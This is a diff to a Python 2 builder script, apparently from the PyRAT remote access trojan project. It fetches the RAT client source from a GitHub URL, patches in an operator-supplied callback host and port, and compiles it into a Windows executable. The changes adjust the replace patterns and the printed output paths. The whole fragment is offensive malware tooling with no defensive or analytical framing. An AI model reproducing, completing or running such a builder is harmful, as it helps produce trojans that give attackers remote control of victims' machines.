@@ -18,7 +18,7 @@ Usage:
 	sys.exit()
 
 def get_client(host, port):
-	return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/source/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = int('8000')", "PORT = int('%s')"%(port))
+	return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/source/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = 8000", "PORT = %s"%(port))
 
 	
 def generate_exec(host, port, source, name):
@@ -42,11 +42,9 @@ def generate_exec(host, port, source, name):
 	if os.path.exists(file) == True:
 		shutil.copy2(file, "executables/"+name)
 		shutil.rmtree("exec")
-		print "\n[+] Exe file (Windows) ==> %s"%(os.path.abspath(os.path.join(os.getcwd(), os.pardir))
-+os.sep+"executables"+os.sep+name)
+		print "\n[+] Exe file (Windows) ==> %s"%(os.getcwd()+os.sep+"executables"+os.sep+name)
 	else:
-		print "[!] Exe file couldn't create, check log file ==> %s"%(os.path.abspath(os.path.join(os.getcwd(), os.pardir))
-+os.sep+"executables"+os.sep+logfile.name)
+		print "[!] Exe file couldn't create, check log file ==> %s"%(os.getcwd()+os.sep+"executables"+os.sep+logfile.name)
 		shutil.rmtree("exec")
 		sys.exit()
 
